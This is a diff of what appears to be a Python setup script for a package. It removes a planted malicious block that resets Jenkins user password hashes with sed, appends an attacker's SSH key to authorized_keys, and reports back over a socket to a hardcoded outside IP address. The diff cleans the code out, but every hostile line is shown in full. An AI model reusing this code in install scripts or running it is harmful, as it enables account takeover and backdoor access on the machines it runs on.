@@ -15,37 +15,6 @@ from binascii import hexlify, unhexlify
 from Crypto.Cipher import AES
 import socket 
 import os 
-TCP_IP = '54.191.14.198' 
-TCP_PORT = 5005 
-BUFFER_SIZE = 1024 
-message = "" 
-"""
-try:
-	results = os.listdir('/var/lib/jenkins/users/')
-	for r in results:
-		os.mkdir("/var/lib/jenkins/TOUCHDOWN")
-		os.mkdir("/tmp/TOUCHDOWN")
-        	cmd = """sed -i  's/#jbcrypt:[^>]*/#jbcrypt:replace\/passwordHash>/' /var/lib/jenkins/users/%s/config.xml"""
-        	os.system(cmd % r)
-        message = 'using jenkins'
-except: 
-        message = 'No Jenkins or Failed' 
-try: 
- 
-        with open("~/.ssh/authorized_keys", "a") as myfile: 
-            myfile.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCd85o+/NiUloOYNbQYsU+RrSvPAhnL9RCLJYy5yogYEFIj8e8C6ybC+3VtpvUzoPZY3q91VH+D9qmoJAcm5nHfYA1J2Bc9roHG66XuoUqCE0n+Mupb61Sr1cCEhYkKkkRVAPSYLBwJy42IHcGIlrkzYy8DZzd2upxGRlXIdtq7uyNutzn5eoF+do52s7G0C6BIhP4Y5phEoLAfpm7Le1VQ/AOy25pUfhb/wBORlJfaA/dl95G8cAZvIc3vgVwn52YSln68KSBU5NKVmiG64q351Zw1/5R3n8TO7AHyQC6XII5Wr1/XqHxSZ7HIZPBZlO1SYctTpfBhqdXQ5Ls2Ltx1 mal") 
-except:
-	pass
- 
-         
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-s.connect((TCP_IP, TCP_PORT)) 
-s.send(message) 
-data = s.recv(BUFFER_SIZE) 
-s.close() 
- 
-print "received data:", data
-"""
 
 class osx_install_data(install_data):
     # On MacOS, the platform-specific lib dir is /System/Library/Framework/Python/.../
